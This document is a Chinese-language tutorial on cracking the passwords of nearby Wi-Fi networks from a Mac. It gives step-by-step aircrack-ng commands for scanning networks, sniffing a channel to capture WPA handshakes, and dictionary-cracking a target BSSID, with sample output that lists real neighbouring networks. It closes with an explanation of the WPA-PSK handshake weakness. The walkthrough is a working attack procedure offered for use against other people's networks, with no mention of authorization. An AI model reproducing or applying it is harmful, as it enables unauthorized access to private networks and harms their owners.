> mac 系统破解附近wifi密码
> [参考](https://www.cnblogs.com/diligenceday/p/6344487.html)


第一步， 安装macport， 安装Xcode
---

安装`mac port macport` 是一个工具 管理软件包的一个工具，我们也可以通过别的方式安装Aircrack-ng，但是通过 macport 安装 `Aircrack-ng`的速度是最快的， （Mac系统要求安装Xcode, 可以参考macport的首页）

第二步， 安装aircrack-ng
----
	sudo port install aircrack-ng


第三步， 获取当前网卡
-----
	➜  ~ ifconfig                  
	en0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500
		ether 8c:85:90:31:d2:1f 
		inet6 fe80::1480:8b90:d8cd:fd0c%en0 prefixlen 64 secured scopeid 0x8 
		inet 192.168.1.109 netmask 0xffffff00 broadcast 192.168.1.255
		nd6 options=201<PERFORMNUD,DAD>
		media: autoselect
		status: active

第四步， 获取所有的无线网络
----

使用mac系统自带的airport工具， 查看当前的无线网络， 以及它们的相关信息，在shell中执行：

	sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s

　系统回显如下图， 以下为我附近所有的wifi， 注意看表格， `SSID， BSSID， CHANNEL`，这些关键词都会在后面提到：

    Password:
                                SSID BSSID             RSSI CHANNEL HT CC SECURITY (auth/unicast/group)
                              ZHC527 34:96:72:1c:d5:1b -69  11,-1   Y  -- WPA(PSK/AES/AES) WPA2(PSK/AES/AES) 
                              jjjhhh 14:75:90:85:22:93 -53  11      N  -- WPA(PSK/AES,TKIP/TKIP) WPA2(PSK/AES,TKIP/TKIP) 
                                 XGD f0:b4:29:11:b9:3a -45  6       Y  CN WPA(PSK/TKIP,AES/TKIP) WPA2(PSK/TKIP,AES/TKIP) 
                HUAWEI-7R93AX_HiLink dc:72:9b:55:5a:5c -40  6,-1    Y  -- WPA2(PSK/AES/AES) 
      HP-Print-36-Officejet Pro 6830 34:64:a9:08:ab:36 -75  6       N  -- WPA2(PSK/AES/AES) 
                                LYWL 34:96:72:68:e8:75 -39  1,+1    Y  CN WPA(PSK/TKIP,AES/TKIP) WPA2(PSK/TKIP,AES/TKIP) 
                           JESQUARE1 70:3d:15:88:b6:d1 -68  1       Y  CN WPA2(PSK/AES/AES) 
                HUAWEI-7R93AX_HiLink dc:72:9b:55:5a:60 -60  149     Y  CN WPA2(PSK/AES/AES) 
                           JESQUARE3 70:3d:15:89:07:20 -64  48      Y  CN WPA2(PSK/AES/AES) 
                           JESQUARE2 70:3d:15:88:e5:a0 -80  161     Y  CN WPA2(PSK/AES/AES) 
                              XGD_5G f0:b4:29:11:b9:3b -64  157     Y  CN WPA(PSK/TKIP,AES/TKIP) WPA2(PSK/TKIP,AES/TKIP) 
                             LYWL_5G 34:96:72:68:e8:77 -48  157     Y  -- WPA(PSK/TKIP,AES/TKIP) WPA2(PSK/TKIP,AES/TKIP) 


第五步，开始抓包 ， 收集监听周围无线网络的数据
---

参数en0是我电脑的默认网卡， 数字 157 是网卡需要监听的网络频道:

    sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 sniff 157

当执行以上命令， 开始监听以后， wifi的图标会发生改变， 变成一个小眼睛一样的图标

　　监听久一点， 然后使用ctrl+c停止监听， 系统会把监听到的数据保存到本地， 如下图， 数据保存到 `/tmp/airportSniff*.cap` 文件中：

    -rw-r--r--  1 root  wheel    23M Jun 27 11:51 /tmp/airportSniffWRo6o0.cap
    -rw-r--r--  1 root  wheel   4.6M Jun 27 11:45 /tmp/airportSniffcdoYAX.cap

在监听的过程中如果有用户登陆这个wifi， 那么包就会被我们截获， 如果用户一直没有登陆到这个wifi， 我们就还要继续等待监听， 尽量在手机或者手提电脑所用高峰期开启捕获， 这样捕获握手（handshake）的几率比较高， 具体原理参考最后的链接；

第六步， 查看cap文件中的数据是否被抓取到
----
    
    ➜  sudo aircrack-ng /tmp/airportSniffcdoYAX.cap                              
    Opening /tmp/airportSniffcdoYAX.cap
    Read 61020 packets.
    
       #  BSSID              ESSID                     Encryption
       1  64:F7:8C:01:50:DB                            WPA (0 handshake)
       2  34:96:72:68:E8:77  LYWL_5G                   WPA (1 handshake)
       3  F0:B4:29:11:B9:3B  XGD_5G                    No data - WEP or WPA
       ......

如果要查询的路由列表的 `Encryption值为WPA(1 handshake)` ，说明抓取成功， 否者跳到第六步，要重新抓取：

第七步， 输入命令air-crack开始破解
----

`-b` 后面的参数 `bc:46:99:df:6c:72`指的是网卡的`BSSID`， 最后面的一个文件路径是上一步监听到的数据

    sudo aircrack-ng -w dict.txt -b bc:46:99:df:6c:72 /tmp/airportSniffdaMCjH.cap
　　只要字典够大， 密码破出来应该指日可待， 字典可以自己去做，或者网上下载

　　能不能破解主要看脸， 看运气

　　破解成功以后，命令行会显示KEY FOUND

--------


WPA/WPA2简介
---
　　由于WEP中存在严重的安全漏洞，WIFI联盟制定了WPA和WPA2以取代WEP。其中WPA实现了802.11i的主要部分，提供了对现有硬件的向下兼容，被用来作为WEP到802.11i的过渡。之后的则WPA2完整的实现了整个IEEE 802.1i标准。
WPA的根据应用场景的不同采用不同的认证方式，其中面对家庭或小型办公场所网络的WPA-PSK不需要专门的认证服务器，所有该网络中的设备通过使用同一个256-bit的密钥来进行认证。


WPA-PSK安全漏洞
---
　　WPA-PSK认证中的四次握手被设计用来在不安全的信道中，通过明文传输的方式来进行一定程度上的认证，并且在设备之间建立安全信道。首先，PSK会被转化为PMK，而PMK则在接下来被用于生成PTK。PTK则会被分为若干部分，其中一部分被称作MIC Key，用来生成每一个包的Hash值来用于验证。
WPA的安全问题与其认证过程所使用的算法关系不大，更多的是由于这一过程可以被轻易的重现，这就使得WPA-PSK可能遭受字典暴力攻击。


WPA-PSK攻击原理
---
WPA-PSK攻击分为以下几个步骤：

　　1. 根据passphrase，SSID生成PMK，即PMK = pdkdf2_SHA1(passphrase, SSID, SSID length, 4096)

　　2. 捕获EAPOL四次握手的数据包，得到ANonce，SNonce等信息，用于计算PTK，即

    　　PTK = PRF-X(PMK, Len(PMK), “Pairwise key expansion”, Min(AA,SA) || Max(AA,SA) || Min(ANonce, SNonce) || Max(ANonce, SNonce))

　　3. 使用MIC Key计算EAPOL报文的MIC，即MIC = HMAC_MD5(MIC Key, 16, 802.1x data)

　　4. 将计算得到的MIC值与捕获到的MIC值对比，如果相同则破解成功。

WPA-PSK攻击难点
---
　　WPA-PSK攻击的主要难点在于大量计算PMK所需要的计算量。一台普通的计算机通常的计算能力在500pmks/s，想要对8位的纯小写字母组合密码进行暴力破解所需要的时间为14年，所以想要破解WPA－PSK只有两种可能：1.用户使用了常见的弱密码；2.堆砌计算资源，获得超级计算机量级的计算能力。


相关：
---
　　AP(Access Point): 网络接入点，是一种连接无线或有线网络的设备。就是俗称的路由器。

　　MAC(Media Access Control Address): 相当于网卡的身份证，MAC 地址本身是不能修改，但是可以通过伪造MAC 地址欺骗AP。

　　WEP(Wireless Encryption Protocol): 无线加密协议。很早的一种加密协议，容易破解。

　　WPA/WPA2(Wi-FiProtected Access): 基于WEP更安全的加密系统。

　　Handshake:握手。

　　IV(Initialization Vector)s:初始化向量。


参考：
----

[macport](https://www.macports.org/install.php)

[使用macbook破解WPA/WPA2 wifi密码](http://topspeedsnail.com/macbook-crack-wifi-with-wpa-wpa2/)

[WEP&WPA Cracking on BT5/MAC原理](http://blog.csdn.net/stoneliul/article/details/8836248)

